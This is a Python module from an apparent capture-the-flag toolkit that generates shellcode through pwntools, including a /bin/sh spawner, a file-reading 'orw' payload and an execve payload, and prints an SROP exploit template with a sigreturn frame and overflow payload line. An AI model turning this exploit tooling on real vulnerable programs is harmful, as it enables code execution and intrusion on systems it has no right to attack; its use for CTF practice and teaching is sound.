"""Generate common shellcode via pwntools shellcraft (optional dependency).

    ctfkit shellcode sh                 # execve("/bin/sh")
    ctfkit shellcode orw --arg flag.txt # open/read/write a file (cat the flag)
    ctfkit shellcode exec --arg /bin/sh # execve a program
    ctfkit shellcode srop               # a SROP template (printed, not assembled)

pwntools is imported lazily and needs an assembler for the target arch
(binutils); without it the command prints a clear hint instead of failing.
"""
from .ui import C, bad, good, hdr, info, warn


def _load_pwn():
    """Return (context, shellcraft, asm) or None."""
    try:
        from pwn import asm, context, shellcraft
        return context, shellcraft, asm
    except Exception:
        return None


def build_source(kind, arg, shellcraft):
    """Return shellcraft assembly text for `kind`. Raises ValueError on bad input."""
    if kind == "sh":
        return shellcraft.sh()
    if kind in ("orw", "cat"):
        if not arg:
            raise ValueError("need a file path:  shellcode orw --arg flag.txt")
        return shellcraft.cat(arg)
    if kind == "exec":
        if not arg:
            raise ValueError("need a program path:  shellcode exec --arg /bin/sh")
        return shellcraft.execve(arg, [arg], 0)
    raise ValueError(f"unknown shellcode type: {kind}")


def format_shellcode(code):
    """Return {len, hex, escaped} for a bytes payload."""
    return {
        "len": len(code),
        "hex": code.hex(),
        "escaped": "".join(f"\\x{b:02x}" for b in code),
    }


_SROP_TEMPLATE = r'''# SROP (sigreturn-oriented programming) template -- fill in your gadgets.
# Needs: a `syscall; ret` gadget, control of RAX (e.g. pop rax; ret), and a way
# to set RAX=15 (sigreturn) then return into `syscall`.
from pwn import *
context.arch = "amd64"

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = BINSH_ADDR        # address of "/bin/sh\x00"
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL_GADGET    # address of a `syscall` instruction
frame.rsp = SAFE_STACK        # a writable, aligned stack address

# payload = b"A"*OFFSET + p64(POP_RAX) + p64(15) + p64(SYSCALL_GADGET) + bytes(frame)
'''


def cmd_shellcode(kind, arg=None, arch="amd64", out=None):
    hdr("shellcode")
    if kind == "srop":
        print(_SROP_TEMPLATE)
        return
    pwn = _load_pwn()
    if pwn is None:
        bad("pwntools required for shellcode (pip install pwntools; needs binutils)")
        return
    context, shellcraft, asm = pwn
    context.arch = arch
    try:
        src = build_source(kind, arg, shellcraft)
    except ValueError as e:
        bad(str(e))
        return
    try:
        code = asm(src)
    except Exception as e:
        bad(f"assembly failed ({e}); is an assembler for {arch} installed?")
        return

    f = format_shellcode(code)
    good(f"{kind} shellcode  ({arch}, {f['len']} bytes)")
    print(f"  {C.DIM}# {('; '.join(src.split(chr(10)))[:70])}...{C.RST}")
    print(f"  {C.CY}{f['escaped']}{C.RST}")
    print(f"  {C.DIM}hex:{C.RST} {f['hex']}")
    info(f"pwntools:  asm(shellcraft.{kind}({arg!r}))" if arg
         else f"pwntools:  asm(shellcraft.{kind}())")
    if out:
        try:
            with open(out, "wb") as fh:
                fh.write(code)
            good(f"raw bytes written to {out}")
        except OSError as e:
            warn(f"could not write {out}: {e}")
